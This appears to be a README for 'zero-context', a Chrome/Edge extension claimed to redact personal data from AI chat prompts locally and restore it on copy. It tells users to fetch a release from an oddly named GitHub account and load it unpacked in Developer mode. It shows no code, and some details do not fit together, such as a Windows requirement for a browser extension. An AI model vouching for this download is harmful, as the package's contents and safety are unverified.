# 🛡️ zero-context - Private AI, Zero Leaks

[![Download zero-context](https://img.shields.io/badge/Download-zero--context-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/Irongrey-genusengelmannia453/zero-context/releases)

---

## 🔍 What Is zero-context?

zero-context is a **privacy guard for your AI chats**. It works quietly in your browser while you use ChatGPT, Claude, Gemini, or any other AI website. This extension automatically finds and hides sensitive personal information—like names, phone numbers, email addresses, and credit card numbers—**before** your message is sent to the AI. When you copy the AI's response, your original private details are instantly restored. You get full answers, but the AI never sees your secrets.

Think of it as a secure envelope for your prompts. Your data stays local, nothing is uploaded, and everything happens in milliseconds.

---

## ⚡ Why You Need This

Every time you paste an email, a phone number, or a client name into an AI chat, that information leaves your computer. Even if you trust the AI company, why risk it? zero-context ensures:

- **Zero latency** – Redaction happens instantly on your device.
- **Zero data loss** – Your original text is restored when you copy results.
- **Zero cloud processing** – All detection runs locally in your browser using advanced AI models.

---

## 🚀 Getting Started

### Step 1: Download the Extension

Visit this link to download the application:

[**https://github.com/Irongrey-genusengelmannia453/zero-context/releases**](https://github.com/Irongrey-genusengelmannia453/zero-context/releases)

Click the green "Download" button or the latest release file listed on that page.

---

### Step 2: Install in Your Browser (Chrome or Edge)

1. Open your Chrome browser (or Microsoft Edge).
2. Type `chrome://extensions` in the address bar and press Enter.
3. In the top-right corner, turn on **Developer mode** (the toggle switch).
4. Click the **Load unpacked** button that appears.
5. Navigate to the folder where you downloaded and extracted zero-context, select that folder, and click **Select Folder**.
6. The extension icon will appear in your browser toolbar.

> **Tip:** If you downloaded a ZIP file, extract it first by right-clicking and choosing "Extract All" before loading the folder.

---

### Step 3: Start Using It

1. Click the zero-context icon in your toolbar.
2. Toggle the switch to **ON**.
3. Open ChatGPT, Claude, Gemini, or any AI website.
4. Type your prompt normally. The extension will automatically protect your sensitive data.
5. Copy the AI response—your original details are restored automatically.

---

## 🎯 What It Protects

| Data Type | Example |
|-----------|---------|
| 📧 Email addresses | `john.doe@company.com` |
| 📱 Phone numbers | `+1 (555) 123-4567` |
| 🏦 Credit card numbers | `4111 1111 1111 1111` |
| 🪪 Full names | `Sarah Johnson` |
| 🏠 Home addresses | `123 Main Street, Springfield` |
| 🔢 Social security numbers | `123-45-6789` |
| 🗓️ Dates of birth | `05/14/1990` |

---

## 🔒 How It Works (Simple Explanation)

zero-context uses a tiny AI model that runs **directly in your browser** using WebAssembly (WASM). This means:

- No internet connection is needed for detection.
- Your text never leaves your device for analysis.
- The AI model is small and fast—under 20MB.
- Detection happens in under 50 milliseconds.

When you type a prompt, the extension:

1. **Scans** your text for patterns that look like personal data.
2. **Replaces** those patterns with placeholder tags like `[EMAIL_1]`.
3. **Sends** the cleaned text to the AI.
4. **Tracks** the mapping between placeholders and real values.
5. **Restores** the original data when you copy the output.

---

## 🖥️ System Requirements

| Requirement | Minimum |
|-------------|---------|
| Operating System | Windows 10 or 11 |
| Browser | Google Chrome (version 88+) or Microsoft Edge |
| RAM | 4 GB (8 GB recommended) |
| Storage | 50 MB free space |
| Internet | Required only for downloading the extension |

---

## 🛠️ Advanced Features

### Custom Redaction Rules

You can add your own patterns. For example, if you want to protect employee IDs that follow a specific format like `EMP-12345`, go to the extension settings and add a custom rule.

### Per-Site Toggle

Don't want protection on a specific website? Right-click the extension icon and select "Disable on this site."

### Clipboard Control

You can choose whether to restore original data on copy, or keep the redacted version. This is useful if you're copying text to share with someone else.

### Log Viewer

See exactly what was redacted and when. This log stays on your device and is never transmitted.

---

## ❓ Frequently Asked Questions

### Is my data stored anywhere?

No. Everything stays in your browser's local memory. The extension has no servers, no accounts, and no tracking.

### Will this slow down my AI chats?

No. The processing is extremely fast—usually under 50 milliseconds. You won't notice any difference.

### Does it work with all AI websites?

It works with most major AI platforms including ChatGPT, Claude, Gemini, Perplexity, and many others. If a site isn't supported, you can add it manually in settings.

### What if I copy text to another application?

When you copy from an AI response, the original data is restored automatically. If you paste that text elsewhere, it will contain your original information.

### Can I turn it off temporarily?

Yes. Click the extension icon and toggle it off. It will stay off until you turn it back on.

---

## 📦 What's in the Package

When you download the latest release, you'll find:

- `manifest.json` – The extension configuration file.
- `content.js` – The script that runs on AI websites.
- `background.js` – Handles background processing.
- `onnx/` – The AI model files for detection.
- `icons/` – Extension icons for your browser.
- `styles.css` – The interface styling.

You don't need to understand these files. Just load the entire folder into Chrome as described above.

---

## 🧪 Testing the Extension

After installation, try this test:

1. Open ChatGPT.
2. Type: "My email is test@example.com and my phone is 555-123-4567. Summarize this."
3. Before sending, look at what was actually sent (you can check in the extension log).
4. You'll see the email and phone were replaced with placeholders.
5. When you copy the response, your original email and phone number will appear.

---

## 🔄 Updating

To update zero-context:

1. Visit the download link again.
2. Download the latest version.
3. Go to `chrome://extensions`.
4. Click the refresh icon on the zero-context card.
5. Select the new folder if prompted.

---

## 🆘 Troubleshooting

### Extension won't load

- Make sure Developer mode is ON.
- Ensure you selected the correct folder (the one containing `manifest.json`).
- Try restarting your browser.

### Redaction not working on a site

- Check if the site is in your "Disabled Sites" list.
- Try refreshing the page after enabling the extension.
- Add the site manually in settings if needed.

### Copy doesn't restore original data

- Make sure clipboard control is set to "Restore original."
- Try copying again after a moment.
- Restart the browser.

---

## 📄 License

This project is released under the MIT License. You are free to use, modify, and distribute it.

---

## 🤝 Support

If you encounter any issues, please visit the GitHub repository and open an issue. Include your browser version and a description of the problem.

---

## ✨ Final Thoughts

Your conversations with AI should not cost you your privacy. zero-context gives you the best of both worlds—powerful AI assistance without exposing your personal data. It's fast, free, and runs entirely on your device.

Download it today and chat with confidence.

---

Keywords: chatgpt, chrome-extension, claude, data-loss-prevention, gemini, llm-safety, manifest-v3, onnx, pii-redaction, privacy, transformers-js, typescript, wasm